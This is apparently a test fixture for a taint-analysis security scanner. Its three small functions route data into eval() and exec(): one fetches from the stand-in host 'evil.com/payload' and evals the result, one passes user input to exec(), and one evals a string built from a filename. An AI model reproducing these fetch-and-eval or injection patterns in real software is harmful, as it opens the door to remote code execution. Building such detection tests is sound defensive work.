// Complex taint propagation paths (ML syntax with malicious patterns)
function processNetworkData() {
    url = "http://evil.com/payload";
    response = fetch(url);
    data = response + "_fetched";

    // Multi-step taint propagation
    processed = data + "_processed";
    cleaned = processed + "_cleaned";
    encoded = cleaned + "_encoded";
    decoded = encoded + "_decoded";

    // Should detect this taint flow
    return eval(decoded);
}

function indirectTaintPropagation(userInput) {
    container = {};
    container.data = userInput;
    container.source = "user";

    // Taint through object property access
    extracted = container.data;
    transformed = extracted + "_UPPER";

    // Should detect this as tainted
    return exec(transformed);
}

// File-based taint propagation
function processConfigFile(filename) {
    content = "config_data_from_" + filename;

    // Simulate config parsing
    enableDynamic = true;
    if (enableDynamic) {
        command = content + "_command";
        return eval(command);
    }

    return content;
}

// Test taint propagation
networkResult = processNetworkData();
indirectResult = indirectTaintPropagation("malicious input");
configResult = processConfigFile("config.json");